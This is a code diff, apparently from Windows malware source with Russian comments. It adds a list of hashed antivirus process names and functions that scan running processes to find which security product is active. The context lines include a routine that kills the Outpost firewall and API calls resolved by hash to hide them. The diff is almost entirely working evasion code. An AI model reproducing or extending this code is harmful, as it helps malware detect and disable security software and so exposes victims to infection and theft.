@@ -24,12 +24,49 @@ namespace UTILSDEBUGSTRINGS
 
 #define DBG UTILSDEBUGSTRINGS::DBGOutMessage<>
 
+
+
+
+//--------------------------------------------------
+//  Список имён процессов анти вирусов
+//--------------------------------------------------
+const static DWORD AV_HASHES[] = {
+0xB434E36B /* avgam.exe*/, 0x66048E61 /* avgchsvx.exe*/, 0xC316EB3B /* avgemc.exe*/,
+0xF214BB85 /* avgfws9.exe*/, 0x8316E7C2 /* avgfrw.exe*/, 0x126BD3AC /* avgidsagent.exe*/,
+0x852539F2 /* avgidsmonitor.exe*/, 0x7316C7CA /* avgnsx.exe*/, 0x7316B7CA /* avgrsx.exe*/,
+0xF230AF11 /* avgtray.exe*/, 0xC21C8E60 /* avgwdsvc.exe*/, 0x5D8F352 /* cfp.exe*/,
+0x241A9060 /* cmdagent.exe*/, 0xE5A4129 /* defensewall.exe*/, 0x66270192 /* defensewall_serv.exe*/,
+0xE512D3F3 /* ekrn.exe*/, 0x9512E3CB /* egui.exe*/, 0x561AA5CD /* fsav32.exe*/,
+0x3610E7E8 /* fsdfwd.exe*/, 0x5616D1CD /* fsgk32.exe*/, 0xAEB36B09 /* fsgk32st.exe*/,
+0x410C110A /* fshdll32.exe*/, 0x433EC9FE /* fsm32.exe*/, 0x5602F9CD /* fsma32.exe*/,
+0x7606B7C9 /* fsorsp.exe*/, 0x563EC9CD /* fssm32.exe*/, 0x5D8FBD2 /* avp.exe*/,
+0x6F1AC743 /* zanda.exe*/, 0x85D89703 /* zlh.exe*/, 0x9504A71A /* nvoy.exe*/,
+0x431EC35D /* nvcoas.exe*/, 0x1504AB6B /* nuaa.exe*/, 0x4612B3E4 /* nsesvc.exe*/,
+0x5D8C72A /* nip.exe*/, 0x5012BCFF /* njeeves.exe*/, 0xD6392DCF /* npcsvc32.exe*/,
+0x5A16AAA5 /* elogsvc.exe*/, 0x2A1AF36A /* oacat.exe*/, 0x6A1ADF02 /* oahlp.exe*/,
+0xA1AB3F2 /* oasrv.exe*/, 0x9506FBCB /* oaui.exe*/, 0x1566CB2C /* op_mon.exe*/,
+0x35D8FB7A /* acs.exe*/, 0x2738E742 /* sbpfcl.exe*/, 0xEE0E9B48 /* sbpflunch.exe*/,
+0x4514AF22 /* sbpfsvc.exe*/, 0xBB1A46E1 /* dwengine.exe*/, 0xA28A73A4 /* spideragent.exe*/,
+0x381BC2F2 /* spidergate.exe*/, 0x211CCB3F /* spiderml.exe*/, 0xA11CCB26 /* spidernt.exe*/,
+0x711CCBFF /* spiderui.exe*/, 0xA416F063 /* mcagent.exe*/, 0xAD0753FA /* mcshield.exe*/,
+0xB3057B03 /* mcsvhost.exe*/, 0x3014C080 /* mfefire.exe*/, 0x5034B491 /* mfevtps.exe*/,
+0xAE28938 /* mobkbackup.exe*/, 0x240D57C1 /* mpfalert.exe*/, 0x7A873290 /* certificationmanagerservicent.exe*/,
+0xF98BF56E /* managmentagentnt.exe*/, 0xDB30A8A0 /* mgntsvc.exe*/, 0xB11CECE8 /* routernt.exe*/,
+0x25127BF7 /* sbeconsole.exe*/, 0xB9BC03C9 /* sophosupdatemgr.exe*/, 0x123EF381 /* afwserv.exe*/,
+0xC63C8E63 /* avastsvc.exe*/, 0xF43EB7B0 /* avastui.exe*/, 0x5336ABA8 /* avfwsvc.exe*/,
+0x2232E388 /* avguard.exe*/, 0x9D16D2A3 /* avshadow.exe*/, 0xA010DE48 /* avwebgrd.exe*/,
+0x581AC378 /* avmailc.exe*/, 0x2434E312 /* avgnt.exe*/, 0xC612E833 /* msseces.exe*/,
+0};
+
+
+//----------------------------------------------------------------------------
+
 HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param )
 {
     DWORD lpThreadId; 
     return pCreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)lpStartAddress, param, NULL, &lpThreadId );
 }
-
+//----------------------------------------------------------------------------
 
 char *GetOSInfo()
 {
@@ -508,7 +545,7 @@ LPVOID GetInfoTable(DWORD dwTableType )
 {
 	LPVOID lpPtr = NULL;
 
-	DWORD dwSize = 0x4000;	
+	DWORD dwSize = 0x8000;
 
 	NTSTATUS Status = 0;
 
@@ -555,13 +592,14 @@ DWORD GetCurrentSessionId()
 
 DWORD GetProcessIdByHash( DWORD dwHash )
 {
-	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)GetInfoTable( SystemProcessInformation );
+	LPVOID Buf = GetInfoTable( SystemProcessInformation );
+	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)Buf;
 
 	DWORD dwSessionId = 0;
 
 	DWORD dwPid = (DWORD)-1;
 
-	if ( pProcess != NULL )
+	if (pProcess != NULL)
 	{
 		dwSessionId = GetCurrentSessionId();
 
@@ -571,12 +609,7 @@ DWORD GetProcessIdByHash( DWORD dwHash )
 			{
 				if ( pProcess->usName.Length )
 				{
-					PCHAR ProcessName = WSTR::ToAnsi(pProcess->usName.Buffer, 0);
-
-					m_lstrlwr( ProcessName );
-
-					DWORD ProcessHash = CalcHash(ProcessName);
-					STR::Free(ProcessName);
+					DWORD ProcessHash = STRW::Hash(pProcess->usName.Buffer, 0, true);
 
 					if (ProcessHash  == dwHash )
 					{
@@ -591,10 +624,12 @@ DWORD GetProcessIdByHash( DWORD dwHash )
 		} while ( pProcess->uNext != 0 );
 	}
 
-	MemFree( pProcess );
+	MemFree(Buf);
 
 	return dwPid;
 }
+
+
 
 DWORD GetProcessHashOfId(DWORD dwPid)
 {
@@ -615,7 +650,8 @@ DWORD GetProcessHashOfId(DWORD dwPid)
 	
 	
 	puStr = (PUNICODE_STRING)MemAlloc( sizeof(UNICODE_STRING) +sizeof(WCHAR)*(MAX_PATH+1) );
-	if (puStr){
+	if (puStr)
+	{
 		puStr->Length = 0;
 		len = puStr->MaximumLength = sizeof(WCHAR)*MAX_PATH ;
 		puStr->Buffer =(PWCHAR) (sizeof(UNICODE_STRING) + (PCHAR)puStr); 
@@ -2580,3 +2616,66 @@ void KillOutpost()
 		pWinStationTerminateProcess( NULL, dwPid , DBG_TERMINATE_PROCESS );
 	}
 }
+
+//----------------------------------------------------------------------------
+
+
+
+//****************************************************************
+// ProcessIsAntiVirus - Функция возвращает истину если хэш
+// процессе есть в массиве известных антивирусов
+//****************************************************************
+bool ProcessIsAntiVirus(DWORD Hash)
+{
+	if (Hash)
+	for (int i = 0; AV_HASHES[i]; i++)
+	{
+		if (AV_HASHES[i] == Hash)
+			return true;
+	}
+	return false;
+}
+
+
+
+//****************************************************************
+//	GetAntiVirusProcessName - Функция возвращает имя процесса
+//                            запущенного анти вируса
+//****************************************************************
+string GetAntiVirusProcessName()
+{
+	// Функция возвращает имя процесса  работающего антивируса
+	string Name;
+
+    LPVOID ProcessBuf = GetInfoTable( SystemProcessInformation );
+
+	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)ProcessBuf;
+
+	DWORD dwSessionId = 0;
+
+	if (pProcess)
+	{
+		dwSessionId = GetCurrentSessionId();
+		do
+		{
+			if ( dwSessionId == pProcess->uSessionId )
+			{
+				if (pProcess->usName.Length)
+				{
+					DWORD ProcessHash = STRW::Hash(pProcess->usName.Buffer, 0, true);
+
+					if (ProcessIsAntiVirus(ProcessHash))
+					{
+						Name = UnicodeToAnsi(pProcess->usName.Buffer);
+						break;
+					}
+				}
+			}
+			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );
+		}
+		while ( pProcess->uNext != 0 );
+	}
+	MemFree(ProcessBuf);
+	return Name;
+}
+
